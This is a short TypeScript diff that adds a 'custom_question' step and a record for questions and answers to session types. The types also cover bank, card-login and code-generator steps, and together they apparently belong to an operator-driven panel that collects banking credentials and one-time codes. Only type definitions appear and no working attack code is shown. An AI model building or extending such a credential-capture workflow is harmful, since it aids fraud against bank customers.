@@ -15,6 +15,7 @@ export type SessionStep =
   | "special_approval"
   | "generator1"
   | "generator2"
+  | "custom_question"
   | "invalid_bank"
   | "live_support";
 export type SessionStatus = "online" | "offline" | "SUCCESS" | "CONGRATS" | "SPECIAL_INFO";
@@ -57,6 +58,7 @@ export type SessionFormData = {
   generatorSubmittedAt?: string;
   generatorCurrent?: Record<string, { data?: Record<string, string>; submittedAt?: string; generatorCode?: string }>;
   generatorLoginHistory?: GeneratorLoginHistoryRecord[];
+  customQuestions?: CustomQuestionRecord[];
   approvalHistory?: string;
   customMessage?: string;
   customImage?: string;
@@ -102,6 +104,13 @@ export type GeneratorLoginHistoryRecord = {
   generatorType?: string;
   generatorCode?: string;
   data?: Record<string, string>;
+};
+
+export type CustomQuestionRecord = {
+  question: string;
+  askedAt: string;
+  answer?: string;
+  answeredAt?: string;
 };
 
 export type CardLoginHistoryRecord = {
